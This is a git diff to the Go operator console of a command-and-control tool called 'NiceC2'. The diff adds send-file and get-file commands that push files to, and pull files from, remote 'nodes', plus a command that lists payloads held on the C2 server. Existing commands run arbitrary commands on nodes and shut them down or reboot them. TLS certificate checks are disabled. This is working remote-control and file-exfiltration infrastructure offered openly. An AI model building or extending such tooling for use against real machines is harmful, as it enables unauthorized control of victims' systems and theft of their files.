@@ -5,6 +5,7 @@ import (
 	"bytes"
 	"crypto/tls"
 	"encoding/json"
+	"errors"
 	"fmt"
 	"io"
 	"log"
@@ -59,12 +60,15 @@ func main() {
 		text = strings.Replace(text, "\n", "", -1)
 
 		if strings.Compare("help", text) == 0 {
-			fmt.Println("ls 			- List all nodes")
-			fmt.Println("tasks <node> 		- Display the tasks associated with a specific device. Leave blank to show all tasks")
-			fmt.Println("run <node> 		- Run a single command on a Node")
-			fmt.Println("shutdown <node> 	- shutdown device")
-			fmt.Println("reboot <node>		- reboot")
-			fmt.Println("Exit 			- Exit the NiceC2 interface")
+			fmt.Println("ls\t\t\t\t\t\t\t- List all nodes")
+			fmt.Println("tasks <node>\t\t\t\t\t\t- Display the tasks associated with a specific device. Leave blank to show all tasks")
+			fmt.Println("run <node>\t\t\t\t\t\t- Run a single command on a Node")
+			fmt.Println("shutdown <node>\t\t\t\t\t\t- Shutdown device")
+			fmt.Println("reboot <node>\t\t\t\t\t\t- Reboot device")
+			fmt.Println("Exit\t\t\t\t\t\t\t- Exit the NiceC2 interface")
+			fmt.Println("send-file <node> -f <file> -d <destination path>\t\t- Download file to the client.")
+			fmt.Println("get-file <node> <filepath>\t\t- get-file file from the client.")
+			fmt.Println("payloads \t\t\t\t\t - Lists the available payloads")
 
 		}
 		if strings.Compare("exit", text) == 0 {
@@ -74,7 +78,9 @@ func main() {
 
 		if strings.Compare("ls", text) == 0 {
 			display_nodes()
-
+		}
+		if strings.Compare("payloads", text) == 0 {
+			get_payloads_from_server()
 		}
 
 		if strings.Compare("tasks", text) == 0 {
@@ -104,7 +110,89 @@ func main() {
 			reboot(node)
 		}
 
+		if strings.HasPrefix(text, "send-file") {
+
+			processed_text := text[10:]
+
+			node, file, path, err := parse_send_file(processed_text)
+
+			if err != nil {
+				fmt.Println(err)
+				return
+			}
+
+			fmt.Println("Downloading file " + file + " to " + path + " on " + node)
+
+			send_file(node, file, path)
+
+		}
+
+		if strings.HasPrefix(text, "get-file") {
+
+			text := text[9:]
+
+			node, path, err := parse_get_file(text)
+			if err != nil {
+				fmt.Println(err)
+
+			} else {
+				get_file(node, path)
+				// upload(text)
+			}
+
+		}
+
 	}
+
+}
+
+func parse_get_file(input string) (string, string, error) {
+	// Split by -f first
+	parts := strings.Split(input, " -p ")
+	if len(parts) != 2 {
+		return "", "", errors.New("Invalid input: -p needs to come first")
+	}
+
+	return parts[0], parts[1], nil
+}
+
+func get_file(node string, path string) {
+
+	task_id := create_task_by_ID(node, "get-file", path, "2")
+	fmt.Println("get-file Task created (" + task_id + ")")
+	time.Sleep(5 * time.Second) // Time is added to wait for command to get to / be run on node
+	get_task_by_id(task_id)
+}
+
+func parse_send_file(input string) (string, string, string, error) {
+
+	// Split by -f first
+	parts1 := strings.Split(input, " -f ")
+	if len(parts1) != 2 {
+		return "", "", "", errors.New("Invalid input: -f needs to come first")
+	}
+
+	// Split the second part by -d
+	parts2 := strings.Split(parts1[1], " -d ")
+	if len(parts2) != 2 {
+		return "", "", "", errors.New("Invalid input: missing -d flag")
+
+	}
+
+	// deviceName / file / destination
+	return string(parts1[0]), string(parts2[0]), string(parts2[1]), nil
+
+}
+
+func send_file(node string, file string, path string) {
+
+	// Combining the data
+	data := file + " || " + path
+
+	task_id := create_task_by_ID(node, "send-file", data, "2")
+	fmt.Println("send-file Task created (" + task_id + ")")
+	time.Sleep(5 * time.Second) // Time is added to wait for command to get to / be run on node
+	get_task_by_id(task_id)
 
 }
 
@@ -123,10 +211,6 @@ func reboot(node string) {
 }
 
 func handle_run(node string) {
-
-	// split_args := strings.Split(args, " ")
-
-	// node := split_args[1]
 
 	var command string
 
@@ -381,5 +465,63 @@ func get_tasks() {
 	if err3 != nil {
 		fmt.Println(err2)
 	}
+
+}
+
+func get_payloads_from_server() {
+
+	// var payloads[]
+
+	// This allows us to use a self signed certificate.
+	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
+
+	r, err := http.NewRequest("", command_server+"/list_payloads", bytes.NewBuffer([]byte("")))
+	if err != nil {
+		// panic(err)
+		fmt.Println("Error sending the commands response back")
+	}
+
+	// Add the header to say that it's json
+	r.Header.Add("Content-Type", "application/json")
+
+	//Create a client to send the data and then send it
+	client := &http.Client{}
+	res, err := client.Do(r)
+	if err != nil {
+		fmt.Println("Error sending the commands response back")
+		return
+	}
+
+	// Read the response
+	API_response, err2 := io.ReadAll(res.Body)
+	if err2 != nil {
+		fmt.Println(err2)
+	}
+	API_response_string := string(API_response)
+
+	// // Unmarshal the response into the tasks array
+	// err3 := json.Unmarshal([]byte(API_response_string), &paylods)
+	// if err3 != nil {
+	// 	fmt.Println(err2)
+	// }
+
+	// Converting the string into a slice of filenames.
+	var slice []string
+	err3 := json.Unmarshal([]byte(API_response_string), &slice)
+	if err3 != nil {
+		panic(err)
+	}
+
+	// Making a nice output
+
+	fmt.Println()
+	fmt.Println("Payloads stored in ./payloads")
+	fmt.Println("#############################")
+	fmt.Println()
+	for _, item := range slice {
+		fmt.Println(item)
+	}
+
+	fmt.Println()
 
 }
